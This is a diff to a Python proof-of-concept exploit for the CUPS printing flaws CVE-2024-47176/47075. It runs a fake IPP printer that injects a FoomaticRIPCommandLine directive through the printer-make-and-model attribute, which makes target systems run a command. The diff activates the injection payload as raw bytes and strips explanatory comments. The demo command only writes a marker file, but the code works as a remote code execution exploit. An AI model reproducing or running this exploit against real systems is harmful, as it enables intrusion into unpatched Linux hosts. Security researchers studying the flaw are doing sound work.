@@ -16,10 +16,7 @@ PRINTER_NAME = "FAKE_PRINTER"
 
 print(f"[*] Detected local IP: {CLIENT_IP}")
 
-
-# Minimal IPP response advertising our printer
-# This is where CVE-2024-47075/47175 comes in --
-# these attributes get written into the PPD unsanitized
+#unused function - kept idk why
 def build_empty_response(request_id=1):
     """Minimal valid IPP response for unsupported attribute requests"""
     header = struct.pack(">BBHI", 1, 1, 0x0000, request_id)
@@ -35,14 +32,16 @@ def build_empty_response(request_id=1):
             value_bytes
         )
     
-    attrs = b"\x01"                                         # operation-attributes-tag
+    attrs = b"\x01"                                         
     attrs += attr(0x47, "attributes-charset", "utf-8")
     attrs += attr(0x48, "attributes-natural-language", "en-us")
-    attrs += b"\x04"                                         # printer-attributes-tag (empty group)
-    attrs += b"\x03"                                         # end-of-attributes-tag
+    attrs += b"\x04"                                         
+    attrs += b"\x03"                                         
 
     return header + attrs
 
+#building unsanitized ipp response
+#injects payload into printer-make-and-model field 
 def build_ipp_response(request_id=1):
 
     def attr_enum(tag, name, value):
@@ -128,14 +127,9 @@ def build_ipp_response(request_id=1):
     attrs += attr(0x41, "printer-info", "CVE-2024-47176 PoC Printer")
     
     # THIS IS THE KEY INJECTION - Notice the closed quote after EVL
-    #attrs += attr(0x41, "printer-make-and-model",
-    #              'EVL"\n*FoomaticRIPCommandLine: "echo pwned > /tmp/pwned.txt')
-
-    #attrs += attr(0x41, "printer-make-and-model", "HP LaserJet Pro")
-
     payload_bytes = b'EVL"\n*FoomaticRIPCommandLine: "echo pwned > /tmp/pwned.txt"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'
     
-    # We must manually pack this attribute since we are using raw bytes instead of strings
+    #Manually pack this attribute since we are using raw bytes instead of strings
     name_bytes = b"printer-make-and-model"
     attrs += (
         struct.pack(">B", 0x41) +               # Tag: textWithoutLanguage
@@ -161,9 +155,9 @@ def build_ipp_response(request_id=1):
 
 def handle_client(conn, addr):
     print(f"[+] Incoming connection from {addr[0]}:{addr[1]}")
-    conn.settimeout(5.0) # Prevent hanging on dead connections
-    buffer = b""         # Use a persistent buffer to handle pipelining
-    
+    conn.settimeout(5.0) 
+    buffer = b""         
+
     try:
         while True:
             # 1. Read until we have a complete HTTP header
@@ -181,7 +175,7 @@ def handle_client(conn, addr):
             # 2. Split exactly at the end of the FIRST header
             header_end = buffer.find(b"\r\n\r\n") + 4
             headers = buffer[:header_end]
-            buffer = buffer[header_end:] # Keep pipelined data in the buffer!
+            buffer = buffer[header_end:] 
 
             # Handle Expect: 100-continue
             if b"100-continue" in headers.lower():
